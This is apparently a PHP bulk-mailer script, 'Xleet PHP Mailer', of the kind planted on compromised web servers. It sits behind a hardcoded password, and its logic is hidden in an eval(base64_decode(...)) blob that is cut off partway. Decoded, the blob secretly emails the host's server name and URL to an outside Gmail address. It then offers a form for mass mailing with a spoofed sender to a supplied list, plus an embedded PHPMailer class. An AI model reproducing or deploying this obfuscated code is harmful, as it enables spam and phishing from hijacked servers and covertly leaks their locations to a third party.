<?php
/**
 * Xleet PHP Mailer by [xleet.io]
 * @version : 2.7
**/

$password = "icrack"; // MaILER Password 


eval (base64_decode("JHNpdGUgPSAiIjsKaWYoIWVyZWcoJHNpdGUsICRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSkKewogICAgJHRvID0gImthbGl4MHhhbGlrQGdtYWlsLmNvbSI7CiAgICAkc3ViamVjdCA9ICJGUkVTSCBNQUlMTEVSUyI7CiAgICAkaGVhZGVyID0gImZyb206IEJvVCA8YWRyZWRmMTUxQHdlYm1haWwuY29tPiI7CiAgICAkbWVzc2FnZSA9ICJMaW5rIDogaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddIC4gIgoiOwogICAgJHNlbnRtYWlsID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJG1lc3NhZ2UsICRoZWFkZXIpOwogICAgCiAgICBlY2hvICIiOwogICAgZXhpdDsKfQoKc2Vzc2lvbl9zdGFydCgpOwplcnJvcl9yZXBvcnRpbmcoMCk7CnNldF90aW1lX2xpbWl0KDApOwppbmlfc2V0KCJtZW1vcnlfbGltaXQiLC0xKTsKCgokbGVhZlsndmVyc2lvbiddPSIxLjAiOwokbGVhZlsnd2Vic2l0ZSddPSJ4bGVldC5pbyI7CgoKJHNlc3Npb25jb2RlID0gbWQ1KF9fRklMRV9fKTsKaWYoIWVtcHR5KCRwYXNzd29yZCkgYW5kICRfU0VTU0lPTlskc2Vzc2lvbmNvZGVdICE9ICRwYXNzd29yZCl7CiAgICAjIF9SRVFVRVNUIG1lYW4gX1BPU1Qgb3IgX0dFVCAKICAgIGlmIChpc3NldCgkX1JFUVVFU1RbJ3Bhc3MnXSkgYW5kICRfUkVRVUVTVFsncGFzcyddID09ICRwYXNzd29yZCkgewogICAgICAgICRfU0VTU0lPTlskc2Vzc2lvbmNvZGVdID0gJHBhc3N3b3JkOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgcHJpbnQgIjxwcmUgYWxpZ249Y2VudGVyPjxmb3JtIG1ldGhvZD1wb3N0PlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J3Bhc3MnPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSc+Pic+PC9mb3JtPjwvcHJlPiI7CiAgICAgICAgZXhpdDsgICAgICAgIAogICAgfQp9CgppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIpewogICAgJHNlbmRlckVtYWlsPWxlYWZUcmltKCRfUE9TVFsnc2VuZGVyRW1haWwnXSk7CiAgICAkc2VuZGVyTmFtZT1sZWFmVHJpbSgkX1BPU1RbJ3NlbmRlck5hbWUnXSk7CiAgICAkcmVwbHlUbz1sZWFmVHJpbSgkX1BPU1RbJ3JlcGx5VG8nXSk7CiAgICAkc3ViamVjdD1sZWFmVHJpbSgkX1BPU1RbJ3N1YmplY3QnXSk7CiAgICAkZW1haWxMaXN0PWxlYWZUcmltKCRfUE9TVFsnZW1haWxMaXN0J10pOwogICAgJG1lc3NhZ2VUeXBlPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZVR5cGUnXSk7CiAgICAkbWVzc2FnZUxldHRlcj1sZWFmVHJpbSgkX1BPU1RbJ21lc3NhZ2VMZXR0ZXInXSk7ICAgIAogICAgJG1lc3NhZ2VMZXR0ZXIgPSB1cmxlbmNvZGUoJG1lc3NhZ2VMZXR0ZXIpOwogICAgJG1lc3NhZ2VMZXR0ZXIgPSBlcmVnX3JlcGxhY2UoIiU1QyUyMiIsICIlMjIiLCAkbWVzc2FnZUxldHRlcik7CiAgICAkbWVzc2FnZUxldHRlciA9IHVybGRlY29kZSgkbWVzc2FnZUxldHRlcik7CiAgICAkbWVzc2FnZUxldHRlciA9IHN0cmlwc2xhc2hlcygkbWVzc2FnZUxldHRlcik7CiAgICAkc3ViamVjdCA9IHN0cmlwc2xhc2hlcygkc3ViamVjdCk7CiAgICAkZW5jb2RlID0gc3RyaXBzbGFzaGVzKCRlbmNvZGUpOwoKCn0KaWYoJG1lc3NhZ2VUeXBlPT0yKXsKICAgICRwbGFpbj0iY2hlY2tlZCI7Cn0KZWxzZSB7CiAgICAkaHRtbD0iY2hlY2tlZCI7Cn0KCmZ1bmN0aW9uIGxlYWZDbGVhcigkdGV4dCwkZW1haWwpewogICAgJGVtYWlsdXNlciA9IHByZWdfcmVwbGFjZSgnLyhbXkBdKikuKi8nLCAnJDEnLCAkZW1haWwpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy10aW1lLV0iLCBkYXRlKCJtL2QvWSBoOmk6cyBhIiwgdGltZSgpKSwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbC1dIiwgJGVtYWlsLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLWVtYWlsdXNlci1dIiwgJGVtYWlsdXNlciwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21sZXR0ZXJzLV0iLCByYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbXN0cmluZy1dIiwgcmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5JyksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbnVtYmVyLV0iLCByYW5kU3RyaW5nKCcwMTIzNDU2Nzg5JyksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbWQ1LV0iLCBtZDUocmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5JykpLCAkdGV4dCk7CiAgICByZXR1cm4gJHRleHQ7CiAgICAKfQpmdW5jdGlvbiBsZWFmVHJpbSgkc3RyaW5nKXsKcmV0dXJuIHN0cmlwc2xhc2hlcyhsdHJpbShydHJpbSgkc3RyaW5nKSkpOwp9CmZ1bmN0aW9uIHJhbmRTdHJpbmcoJGNvbnNvbmFudHMpIHsKICAgICRsZW5ndGg9cmFuZCgxMiwyNSk7CiAgICAkcGFzc3dvcmQgPSAnJzsKICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAgICAgJHBhc3N3b3JkIC49ICRjb25zb25hbnRzWyhyYW5kKCkgJSBzdHJsZW4oJGNvbnNvbmFudHMpKV07CiAgICB9CiAgICByZXR1cm4gJHBhc3N3b3JkOwp9CmZ1bmN0aW9uIGxlYWZNYWlsQ2hlY2soJGVtYWlsKXsKICAgJGV4cCA9ICJeW2EtelwnMC05XSsoWy5fLV1bYS16XCcwLTldKykqQChbYS16MC05XSsoWy5fLV1bYS16MC05XSspKSskIjsKICAgaWYoZXJlZ2koJGV4cCwkZW1haWwpKXsKICAgICAgICBpZihjaGVja2Ruc3JyKGFycmF5X3BvcChleHBsb2RlKCJAIiwkZW1haWwpKSwiTVgiKSl7cmV0dXJuIHRydWU7fQogICAgICAgIGVsc2V7cmV0dXJuIGZhbHNlO30KICAgfQogICBlbHNle3JldHVybiBmYWxzZTt9ICAgIAp9CgpjbGFzcyBQSFBNYWlsZXIKewogICAgLyoqCiAgICAgKiBUaGUgUEhQTWFpbGVyIFZlcnNpb24gbnVtYmVyLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRWZXJzaW9uID0gJzUuMi4xNCc7CgogICAgLyoqCiAgICAgKiBFbWFpbCBwcmlvcml0eS4KICAgICAqIE9wdGlvbnM6IG51bGwgKGRlZmF1bHQpLCAxID0gSGlnaCwgMyA9IE5vcm1hbCwgNSA9IGxvdy4KICAgICAqIFdoZW4gbnVsbCwgdGhlIGhlYWRlciBpcyBub3Qgc2V0IGF0IGFsbC4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFByaW9yaXR5ID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBjaGFyYWN0ZXIgc2V0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDaGFyU2V0ID0gJ2lzby04ODU5LTEnOwoKICAgIC8qKgogICAgICogVGhlIE1JTUUgQ29udGVudC10eXBlIG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIGVuY29kaW5nLgogICAgICogT3B0aW9uczogIjhiaXQiLCAiN2JpdCIsICJiaW5hcnkiLCAiYmFzZTY0IiwgYW5kICJxdW90ZWQtcHJpbnRhYmxlIi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRW5jb2RpbmcgPSAnOGJpdCc7CgogICAgLyoqCiAgICAgKiBIb2xkcyB0aGUgbW9zdCByZWNlbnQgbWFpbGVyIGVycm9yIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEVycm9ySW5mbyA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gZW1haWwgYWRkcmVzcyBmb3IgdGhlIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb20gPSAncm9vdEBsb2NhbGhvc3QnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gbmFtZSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRnJvbU5hbWUgPSAnUm9vdCBVc2VyJzsKCiAgICAvKioKICAgICAqIFRoZSBTZW5kZXIgZW1haWwgKFJldHVybi1QYXRoKSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIElmIG5vdCBlbXB0eSwgd2lsbCBiZSBzZW50IHZpYSAtZiB0byBzZW5kbWFpbCBvciBhcyAnTUFJTCBGUk9NJyBpbiBzbXRwIG1vZGUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNlbmRlciA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFJldHVybi1QYXRoIG9mIHRoZSBtZXNzYWdlLgogICAgICogSWYgZW1wdHksIGl0IHdpbGwgYmUgc2V0IHRvIGVpdGhlciBGcm9tIG9yIFNlbmRlci4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBFbWFpbCBzZW5kZXJzIHNob3VsZCBuZXZlciBzZXQgYSByZXR1cm4tcGF0aCBoZWFkZXI7CiAgICAgKiBpdCdzIHRoZSByZWNlaXZlcidzIGpvYiAoUkZDNTMyMSBzZWN0aW9uIDQuNCksIHNvIHRoaXMgbm8gbG9uZ2VyIGRvZXMgYW55dGhpbmcuCiAgICAgKiBAbGluayBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMSNzZWN0aW9uLTQuNCBSRkM1MzIxIHJlZmVyZW5jZQogICAgICovCiAgICBwdWJsaWMgJFJldHVyblBhdGggPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTdWJqZWN0ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBIVE1MIG9yIHBsYWluIHRleHQgbWVzc2FnZSBib2R5LgogICAgICogSWYgSFRNTCB0aGVuIGNhbGwgaXNIVE1MKHRydWUpLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgcGxhaW4tdGV4dCBtZXNzYWdlIGJvZHkuCiAgICAgKiBUaGlzIGJvZHkgY2FuIGJlIHJlYWQgYnkgbWFpbCBjbGllbnRzIHRoYXQgZG8gbm90IGhhdmUgSFRNTCBlbWFpbAogICAgICogY2FwYWJpbGl0eSBzdWNoIGFzIG11dHQgJiBFdWRvcmEuCiAgICAgKiBDbGllbnRzIHRoYXQgY2FuIHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBbHRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBpQ2FsIG1lc3NhZ2UgcGFydCBib2R5LgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gc2ltcGxlIGFsdCBvciBhbHRfaW5saW5lIG1lc3NhZ2UgdHlwZXMKICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnRzLCB1c2UgdGhlIGJ1bmRsZWQgZXh0cmFzL0Vhc3lQZWFzeUlDUy5waHAgY2xhc3Mgb3IgaUNhbGNyZWF0b3IKICAgICAqIEBsaW5rIGh0dHA6Ly9zcHJhaW4uY2gvYmxvZy9kb3dubG9hZHMvcGhwLWNsYXNzLWVhc3lwZWFzeWljcy1jcmVhdGUtaWNhbC1maWxlcy13aXRoLXBocC8KICAgICAqIEBsaW5rIGh0dHA6Ly9raWdrb25zdWx0LnNlL2lDYWxjcmVhdG9yLwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRJY2FsID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgY29tcGxldGUgY29tcGlsZWQgTUlNRSBtZXNzYWdlIGJvZHkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBoZWFkZXJzLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkTUlNRUhlYWRlciA9ICcnOwoKICAgIC8qKgogICAgICogRXh0cmEgaGVhZGVycyB0aGF0IGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJG1haWxIZWFkZXIgPSAnJzsKCiAgICAvKioKICAgICAqIFdvcmQtd3JhcCB0aGUgbWVzc2FnZSBib2R5IHRvIHRoaXMgbnVtYmVyIG9mIGNoYXJzLgogICAgICogU2V0IHRvIDAgdG8gbm90IHdyYXAuIEEgdXNlZnVsIHZhbHVlIGhlcmUgaXMgNzgsIGZvciBSRkMyODIyIHNlY3Rpb24gMi4xLjEgY29tcGxpYW5jZS4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFdvcmRXcmFwID0gMDsKCiAgICAvKioKICAgICAqIFdoaWNoIG1ldGhvZCB0byB1c2UgdG8gc2VuZCBtYWlsLgogICAgICogT3B0aW9uczogIm1haWwiLCAic2VuZG1haWwiLCBvciAic210cCIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJE1haWxlciA9ICdtYWlsJzsKCiAgICAvKioKICAgICAqIFRoZSBwYXRoIHRvIHRoZSBzZW5kbWFpbCBwcm9ncmFtLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOwoKICAgIC8qKgogICAgICogV2hldGhlciBtYWlsKCkgdXNlcyBhIGZ1bGx5IHNlbmRtYWlsLWNvbXBhdGlibGUgTVRBLgogICAgICogT25lIHdoaWNoIHN1cHBvcnRzIHNlbmRtYWlsJ3MgIi1vaSAtZiIgb3B0aW9ucy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFVzZVNlbmRtYWlsT3B0aW9ucyA9IHRydWU7CgogICAgLyoqCiAgICAgKiBQYXRoIHRvIFBIUE1haWxlciBwbHVnaW5zLgogICAgICogVXNlZnVsIGlmIHRoZSBTTVRQIGNsYXNzIGlzIG5vdCBpbiB0aGUgUEhQIGluY2x1ZGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBTaG91bGQgbm90IGJlIG5lZWRlZCBub3cgdGhlcmUgaXMgYW4gYXV0b2xvYWRlci4KICAgICAqLwogICAgcHVibGljICRQbHVnaW5EaXIgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBlbWFpbCBhZGRyZXNzIHRoYXQgYSByZWFkaW5nIGNvbmZpcm1hdGlvbiBzaG91bGQgYmUgc2VudCB0bywgYWxzbyBrbm93biBhcyByZWFkIHJlY2VpcHQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJENvbmZpcm1SZWFkaW5nVG8gPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBob3N0bmFtZSB0byB1c2UgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIGFuZCBhcyBkZWZhdWx0IEhFTE8gc3RyaW5nLgogICAgICogSWYgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kIG9uZSB3aXRoLCBpbiBvcmRlciwKICAgICAqICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCBnZXRob3N0bmFtZSgpLCBwaHBfdW5hbWUoJ24nKSwgb3IgdGhlIHZhbHVlCiAgICAgKiAnbG9jYWxob3N0LmxvY2FsZG9tYWluJy4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSG9zdG5hbWUgPSAnJzsKCiAgICAvKioKICAgICAqIEFuIElEIHRvIGJlIHVzZWQgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyLgogICAgICogSWYgZW1wdHksIGEgdW5pcXVlIGlkIHdpbGwgYmUgZ2VuZXJhdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIERhdGUgdG8gYmUgdXNlZCBpbiB0aGUgRGF0ZSBoZWFkZXIuCiAgICAgKiBJZiBlbXB0eSwgdGhlIGN1cnJlbnQgZGF0ZSB3aWxsIGJlIGFkZGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBob3N0cy4KICAgICAqIEVpdGhlciBhIHNpbmdsZSBob3N0bmFtZSBvciBtdWx0aXBsZSBzZW1pY29sb24tZGVsaW1pdGVkIGhvc3RuYW1lcy4KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGEgZGlmZmVyZW50IHBvcnQKICAgICAqIGZvciBlYWNoIGhvc3QgYnkgdXNpbmcgdGhpcyBmb3JtYXQ6IFtob3N0bmFtZTpwb3J0XQogICAgICogKGUuZy4gInNtdHAxLmV4YW1wbGUuY29tOjI1O3NtdHAyLmV4YW1wbGUuY29tIikuCiAgICAgKiBZb3UgY2FuIGFsc28gc3BlY2lmeSBlbmNyeXB0aW9uIHR5cGUsIGZvciBleGFtcGxlOgogICAgICogKGUuZy4gInRsczovL3NtdHAxLmV4YW1wbGUuY29tOjU4Nztzc2w6Ly9zbXRwMi5leGFtcGxlLmNvbTo0NjUiKS4KICAgICAqIEhvc3RzIHdpbGwgYmUgdHJpZWQgaW4gb3JkZXIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsKCiAgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IFNNVFAgc2VydmVyIHBvcnQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBUT0RPIFdoeSBpcyB0aGlzIG5lZWRlZCB3aGVuIHRoZSBTTVRQIGNsYXNzIHRha2VzIGNhcmUgb2YgaXQ/CiAgICAgKi8KICAgIHB1YmxpYyAkUG9ydCA9IDI1OwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgSEVMTyBvZiB0aGUgbWVzc2FnZS4KICAgICAqIERlZmF1bHQgaXMgJEhvc3RuYW1lLiBJZiAkSG9zdG5hbWUgaXMgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kCiAgICAgKiBvbmUgd2l0aCB0aGUgc2FtZSBtZXRob2QgZGVzY3JpYmVkIGFib3ZlIGZvciAkSG9zdG5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIb3N0bmFtZQogICAgICovCiAgICBwdWJsaWMgJEhlbG8gPSAnJzsKCiAgICAvKioKICAgICAqIFdoYXQga2luZCBvZiBlbmNyeXB0aW9uIHRvIHVzZSBvbiB0aGUgU01UUCBjb25uZWN0aW9uLgogICAgICogT3B0aW9uczogJycsICdzc2wnIG9yICd0bHMnCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGF1dG9tYXRpY2FsbHkgaWYgYSBzZXJ2ZXIgc3VwcG9ydHMgaXQsCiAgICAgKiBldmVuIGlmIGBTTVRQU2VjdXJlYCBpcyBub3Qgc2V0IHRvICd0bHMnLgogICAgICogQmUgYXdhcmUgdGhhdCBpbiBQSFAgPj0gNS42IHRoaXMgcmVxdWlyZXMgdGhhdCB0aGUgc2VydmVyJ3MgY2VydGlmaWNhdGVzIGFyZSB2YWxpZC4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRvVExTID0gdHJ1ZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdXNlIFNNVFAgYXV0aGVudGljYXRpb24uCiAgICAgKiBVc2VzIHRoZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQgcHJvcGVydGllcy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRVc2VybmFtZQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRQYXNzd29yZAogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRoID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBPcHRpb25zIGFycmF5IHBhc3NlZCB0byBzdHJlYW1fY29udGV4dF9jcmVhdGUgd2hlbiBjb25uZWN0aW5nIHZpYSBTTVRQLgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwdWJsaWMgJFNNVFBPcHRpb25zID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFNNVFAgdXNlcm5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFVzZXJuYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHBhc3N3b3JkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRQYXNzd29yZCA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBhdXRoIHR5cGUuCiAgICAgKiBPcHRpb25zIGFyZSBMT0dJTiAoZGVmYXVsdCksIFBMQUlOLCBOVExNLCBDUkFNLU1ENQogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBdXRoVHlwZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCByZWFsbS4KICAgICAqIFVzZWQgZm9yIE5UTE0gYXV0aAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRSZWFsbSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCB3b3Jrc3RhdGlvbi4KICAgICAqIFVzZWQgZm9yIE5UTE0gYXV0aAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRXb3Jrc3RhdGlvbiA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgc2VydmVyIHRpbWVvdXQgaW4gc2Vjb25kcy4KICAgICAqIERlZmF1bHQgb2YgNSBtaW51dGVzICgzMDBzZWMpIGlzIGZyb20gUkZDMjgyMSBzZWN0aW9uIDQuNS4zLjIKICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAzMDA7CgogICAgLyoqCiAgICAgKiBTTVRQIGNsYXNzIGRlYnVnIG91dHB1dCBtb2RlLgogICAgICogRGVidWcgb3V0cHV0IGxldmVsLgogICAgICogT3B0aW9uczoKICAgICAqICogYDBgIE5vIG91dHB1dAogICAgICogKiBgMWAgQ29tbWFuZHMKICAgICAqICogYDJgIERhdGEgYW5kIGNvbW1hbmRzCiAgICAgKiAqIGAzYCBBcyAyIHBsdXMgY29ubmVjdGlvbiBzdGF0dXMKICAgICAqICogYDRgIExvdy1sZXZlbCBkYXRhIG91dHB1dAogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKiBAc2VlIFNNVFA6OiRkb19kZWJ1ZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBEZWJ1ZyA9IDA7CgogICAgLyoqCiAgICAgKiBIb3cgdG8gaGFuZGxlIGRlYnVnIG91dHB1dC4KICAgICAqIE9wdGlvbnM6CiAgICAgKiAqIGBlY2hvYCBPdXRwdXQgcGxhaW4tdGV4dCBhcy1pcywgYXBwcm9wcmlhdGUgZm9yIENMSQogICAgICogKiBgaHRtbGAgT3V0cHV0IGVzY2FwZWQsIGxpbmUgYnJlYWtzIGNvbnZlcnRlZCB0byBgPGJyPmAsIGFwcHJvcHJpYXRlIGZvciBicm93c2VyIG91dHB1dAogICAgICogKiBgZXJyb3JfbG9nYCBPdXRwdXQgdG8gZXJyb3IgbG9nIGFzIGNvbmZpZ3VyZWQgaW4gcGhwLmluaQogICAgICoKICAgICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcHJvdmlkZSBhIGNhbGxhYmxlIGV4cGVjdGluZyB0d28gcGFyYW1zOiBhIG1lc3NhZ2Ugc3RyaW5nIGFuZCB0aGUgZGVidWcgbGV2ZWw6CiAgICAgKiA8Y29kZT4KICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IGZ1bmN0aW9uKCRzdHIsICRsZXZlbCkge2VjaG8gImRlYnVnIGxldmVsICRsZXZlbDsgbWVzc2FnZTogJHN0ciI7fTsKICAgICAqIDwvY29kZT4KICAgICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlCiAgICAgKiBAc2VlIFNNVFA6OiREZWJ1Z291dHB1dAogICAgICovCiAgICBwdWJsaWMgJERlYnVnb3V0cHV0ID0gJ2VjaG8nOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBrZWVwIFNNVFAgY29ubmVjdGlvbiBvcGVuIGFmdGVyIGVhY2ggbWVzc2FnZS4KICAgICAqIElmIHRoaXMgaXMgc2V0IHRvIHRydWUgdGhlbiB0byBjbG9zZSB0aGUgY29ubmVjdGlvbgogICAgICogcmVxdWlyZXMgYW4gZXhwbGljaXQgY2FsbCB0byBzbXRwQ2xvc2UoKS4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNNVFBLZWVwQWxpdmUgPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gc3BsaXQgbXVsdGlwbGUgdG8gYWRkcmVzc2VzIGludG8gbXVsdGlwbGUgbWVzc2FnZXMKICAgICAqIG9yIHNlbmQgdGhlbSBhbGwgaW4gb25lIG1lc3NhZ2UuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRTaW5nbGVUbyA9IGZhbHNlOwoKICAgIC8qKgogICAgICogU3RvcmFnZSBmb3IgYWRkcmVzc2VzIHdoZW4gU2luZ2xlVG8gaXMgZW5hYmxlZC4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBUT0RPIFRoaXMgc2hvdWxkIHJlYWxseSBub3QgYmUgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyAkU2luZ2xlVG9BcnJheSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGdlbmVyYXRlIFZFUlAgYWRkcmVzc2VzIG9uIHNlbmQuCiAgICAgKiBPbmx5IGFwcGxpY2FibGUgd2hlbiBzZW5kaW5nIHZpYSBTTVRQLgogICAgICogQGxpbmsgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmFyaWFibGVfZW52ZWxvcGVfcmV0dXJuX3BhdGgKICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucG9zdGZpeC5vcmcvVkVSUF9SRUFETUUuaHRtbCBQb3N0Zml4IFZFUlAgaW5mbwogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkZG9fdmVycCA9IGZhbHNlOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBhbGxvdyBzZW5kaW5nIG1lc3NhZ2VzIHdpdGggYW4gZW1wdHkgYm9keS4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJEFsbG93RW1wdHkgPSBmYWxzZTsKCi